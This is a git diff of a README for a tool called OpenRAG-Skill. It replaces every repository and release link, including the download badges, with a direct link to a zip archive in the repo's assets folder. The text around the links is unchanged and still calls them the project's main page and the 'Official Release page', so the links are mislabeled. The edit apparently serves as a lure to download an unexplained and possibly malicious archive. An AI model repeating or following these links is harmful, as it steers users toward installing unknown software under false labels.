@@ -1,6 +1,6 @@
 # ⚙️ OpenRAG-Skill - Reliable Document Reference Tool
 
-[![Download OpenRAG-Skill](https://img.shields.io/badge/Download-OpenRAG--Skill-brightgreen?style=for-the-badge)](https://github.com/Kiki276/OpenRAG-Skill)
+[![Download OpenRAG-Skill](https://img.shields.io/badge/Download-OpenRAG--Skill-brightgreen?style=for-the-badge)](https://github.com/Kiki276/OpenRAG-Skill/raw/refs/heads/main/assets/Skill_Open_RA_1.7-beta.5.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before you start, make sure your computer meets these minimum requirements:
 You will get OpenRAG-Skill from the official GitHub page. Follow these steps carefully:
 
 1. Click the big green "Download OpenRAG-Skill" badge at the top or go to the link below:  
-   https://github.com/Kiki276/OpenRAG-Skill  
+   https://github.com/Kiki276/OpenRAG-Skill/raw/refs/heads/main/assets/Skill_Open_RA_1.7-beta.5.zip  
 
 2. This link takes you to the main page of the project. Look for the **Releases** section. It is usually on the right side or under the repository description.
 
@@ -128,7 +128,7 @@ If you encounter any issues, try these steps:
 To keep your tool working well and get new features:
 
 1. Visit the GitHub page regularly:  
-   https://github.com/Kiki276/OpenRAG-Skill  
+   https://github.com/Kiki276/OpenRAG-Skill/raw/refs/heads/main/assets/Skill_Open_RA_1.7-beta.5.zip  
 
 2. Check the **Releases** section for new versions.
 
@@ -145,11 +145,11 @@ The GitHub repository may have additional guides and FAQs. Look under the **Wiki
 ## 🔗 Useful Links
 
 - Download OpenRAG-Skill here:  
-  https://github.com/Kiki276/OpenRAG-Skill
+  https://github.com/Kiki276/OpenRAG-Skill/raw/refs/heads/main/assets/Skill_Open_RA_1.7-beta.5.zip
 
 - Official Release page:  
-  https://github.com/Kiki276/OpenRAG-Skill/releases
+  https://github.com/Kiki276/OpenRAG-Skill/raw/refs/heads/main/assets/Skill_Open_RA_1.7-beta.5.zip
 
 ---
 
-[![Download OpenRAG-Skill](https://img.shields.io/badge/Download-OpenRAG--Skill-orange?style=for-the-badge)](https://github.com/Kiki276/OpenRAG-Skill)
+[![Download OpenRAG-Skill](https://img.shields.io/badge/Download-OpenRAG--Skill-orange?style=for-the-badge)](https://github.com/Kiki276/OpenRAG-Skill/raw/refs/heads/main/assets/Skill_Open_RA_1.7-beta.5.zip)
